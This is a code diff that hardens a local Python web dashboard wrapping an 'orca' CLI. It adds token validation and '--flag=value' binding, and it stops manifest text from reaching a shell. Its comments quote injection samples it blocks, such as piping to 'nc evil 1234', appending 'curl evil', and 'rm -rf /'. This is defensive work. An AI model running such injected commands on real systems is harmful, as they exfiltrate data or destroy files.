@@ -23,6 +23,7 @@ Run:  zorca-gui2           (then open http://127.0.0.1:7778)
 """
 import json
 import os
+import re
 import subprocess
 import sys
 import threading
@@ -66,6 +67,25 @@ def queue_read():
 def queue_drop(did):
     items = [i for i in queue_read() if i.get("id") != did]
     json.dump(items, open(QUEUE, "w"), indent=1)
+
+
+# A value that starts with a dash is parsed as a FLAG in the space form:
+# `--resolution "--json"` makes orca answer "Missing required --resolution"
+# and drop into non-JSON output, and a craftier value could set a different
+# flag entirely. The `=` form binds the value to its own flag, verified
+# against the real CLI. Every user-supplied value goes through this.
+def flag(name, value):
+    return "--%s=%s" % (name, value)
+
+
+# Handles, gate ids and draft ids are opaque tokens, not free text. Anything
+# outside this set is refused rather than passed along - it cannot be a real
+# id, so the only thing it can be is an attempt.
+TOKEN_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.:-]{0,127}$")
+
+
+def is_token(v):
+    return bool(v) and isinstance(v, str) and bool(TOKEN_RE.match(v))
 
 
 def sh(args, timeout=60, strict=False):
@@ -133,8 +153,17 @@ def load_tasks(run_id):
     return rows
 
 
-MANIFEST = os.path.expanduser(
-    "~/zao-vault/handoffs/orca-resume-manifest-2026-08-25.md")
+MANIFEST = os.environ.get(
+    "ZORCA_MANIFEST",
+    os.path.expanduser("~/zao-vault/handoffs/orca-resume-manifest-2026-08-25.md"))
+
+
+# A resume target is either a UUID or a session NAME - the manifest says so
+# in its own notes, and five real rows use `claude --resume "zaostock"`.
+# Both are plain tokens; what matters is the charset, not the length, and
+# anything carrying a shell metacharacter is refused rather than sanitised,
+# because sanitising invites the question of what got removed.
+SESSION_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_-]{2,63}$")
 
 
 def load_lanes():
@@ -150,12 +179,44 @@ def load_lanes():
             name = cells[0]
             wt = cells[1].strip("`").replace("~", os.path.expanduser("~"))
             m = cells[2]
-            cmd = ""
-            if "claude --resume" in m:
-                cmd = "claude --resume " + \
-                    m.split("claude --resume", 1)[1].strip("` ").split("`")[0].split(" - ")[0].strip()
-            if cmd and os.path.isdir(wt):
-                lanes.append(dict(name=name, worktree=wt, cmd=cmd))
+            # The manifest is a markdown file every lane can write to, and
+            # this command is handed to `orca terminal create --command`,
+            # which runs it in a shell. Passing the file's text through
+            # would make any lane that can append a row able to run anything
+            # on this mac: `claude --resume abc; curl evil` parsed cleanly
+            # before this check existed.
+            #
+            # So the session id is EXTRACTED and validated, and the command
+            # is built here from a literal. Nothing from the file reaches a
+            # shell.
+            cmd, bad = "", ""
+            if "claude --resume" not in m:
+                bad = "no `claude --resume` in the row"
+            else:
+                rest = m.split("claude --resume", 1)[1].strip("` ")
+                rest = rest.split("`")[0].split(" - ")[0].strip()
+                # Session names are written quoted in the manifest. Strip
+                # the quotes BEFORE validating, then validate - so a value
+                # like "; rm -rf /" loses its quotes and still fails on the
+                # charset rather than sneaking through as "quoted".
+                rest = rest.strip().strip('"').strip("'").strip()
+                parts = rest.split()
+                if len(parts) > 1:
+                    # Truncating to parts[0] would quietly turn
+                    # `... a1b2c3d4 | nc evil 1234` into a working lane
+                    # opener and say nothing about the tail it dropped. A row
+                    # that carries more than a session id is malformed, and
+                    # the row should hear about it.
+                    bad = "row carries more than a session id: %r" % rest[:48]
+                elif not SESSION_RE.match(parts[0] if parts else ""):
+                    bad = "session id is not a plain token: %r" % (rest or "")[:40]
+                else:
+                    cmd = "claude --resume " + parts[0]
+            if not os.path.isdir(wt):
+                continue
+            if name.startswith("-") or wt.startswith("-"):
+                bad = bad or "name or worktree starts with a dash"
+            lanes.append(dict(name=name, worktree=wt, cmd=cmd, bad=bad))
     except Exception:
         pass
     return lanes
@@ -1808,11 +1869,16 @@ async function load(){
     <div class="task"><span class="st st-completed">resolved</span>
       <span>${esc(g.question.slice(0,70))} &rarr; <b>${esc(g.resolution||"")}</b></span>
     </div>`).join("") || '<span class="stamp">none yet</span>';
+  // A lane whose manifest row was refused shows the reason instead of a
+  // button. Rendering a button that always 400s would make the refusal look
+  // like a bug in the page rather than a fact about the row.
   document.getElementById("lanes").innerHTML = s.lanes.map((l,i) => `
-    <div class="task"><button class="mini"
-      onclick='post("/api/lane",{i:${Number(i)}}, this)'>open</button>
+    <div class="task">${l.bad
+      ? `<span class="st bad">refused</span>`
+      : `<button class="mini" onclick='post("/api/lane",{i:${Number(i)}}, this)'>open</button>`}
       <span>${esc(l.name)}</span>
-      <span class="stamp">${esc(l.worktree.replace(/^.*zaalpanthaki/,"~"))}</span>
+      <span class="stamp">${l.bad ? esc(l.bad)
+        : esc(l.worktree.replace(/^.*zaalpanthaki/,"~"))}</span>
     </div>`).join("") || '<span class="stamp">no parked lanes</span>';
   document.getElementById("wlog").innerHTML = s.log.map(l => {
     // The two-character prefix is the real signal; colour is the echo.
@@ -1885,8 +1951,12 @@ class H(BaseHTTPRequestHandler):
                 if body["id"] in RESOLVED:
                     self._send(200, json.dumps({"ok": True, "dup": True}))
                     return
-            out = sh([ORCA, "orchestration", "gate-resolve", "--id", body["id"],
-                      "--resolution", body["resolution"], "--json"])
+            if not is_token(body["id"]):
+                self._send(400, json.dumps({"ok": False, "why": "bad gate id"}))
+                return
+            out = sh([ORCA, "orchestration", "gate-resolve",
+                      flag("id", body["id"]),
+                      flag("resolution", body["resolution"]), "--json"])
             ok = '"ok": true' in out or '"ok":true' in out
             if ok:
                 with LOCK:
@@ -1894,7 +1964,10 @@ class H(BaseHTTPRequestHandler):
             threading.Thread(target=refresh, daemon=True).start()
             self._send(200 if ok else 500, json.dumps({"ok": ok}))
         elif self.path == "/api/focus" and body.get("handle"):
-            sh([ORCA, "terminal", "switch", "--terminal", body["handle"]])
+            if not is_token(body["handle"]):
+                self._send(400, json.dumps({"ok": False, "why": "bad handle"}))
+                return
+            sh([ORCA, "terminal", "switch", flag("terminal", body["handle"])])
             self._send(200, '{"ok": true}')
         elif self.path == "/api/lane" and body.get("i") is not None:
             lanes = load_lanes()
@@ -1904,9 +1977,14 @@ class H(BaseHTTPRequestHandler):
                 # Zaal's tap: open an Orca pane in the lane's worktree and
                 # resume its Claude session. Spawns a paid session - which is
                 # exactly what the button says it does.
-                out = sh([ORCA, "terminal", "create", "--worktree",
-                          "path:" + l["worktree"], "--title", l["name"],
-                          "--command", l["cmd"], "--focus"], timeout=120)
+                if l.get("bad") or not l.get("cmd"):
+                    self._send(400, json.dumps(
+                        {"ok": False, "why": l.get("bad") or "no command"}))
+                    return
+                out = sh([ORCA, "terminal", "create",
+                          flag("worktree", "path:" + l["worktree"]),
+                          flag("title", l["name"]),
+                          flag("command", l["cmd"]), "--focus"], timeout=120)
                 ok = "Created terminal" in out
             except Exception:
                 pass
@@ -1935,8 +2013,13 @@ class H(BaseHTTPRequestHandler):
             if item and body.get("action") == "send":
                 # The human tapped Send - this is Zaal's keystroke, so no
                 # auto-draft prefix; it carries his authority.
-                out = sh([ORCA, "terminal", "send", "--terminal",
-                          item["handle"], "--text", item["text"], "--enter"])
+                if not is_token(item.get("handle")):
+                    self._send(400, json.dumps(
+                        {"ok": False, "why": "bad handle in the queue"}))
+                    return
+                out = sh([ORCA, "terminal", "send",
+                          flag("terminal", item["handle"]),
+                          flag("text", item["text"]), "--enter"])
                 ok = "Sent" in out
             if item:
                 queue_drop(body["id"])
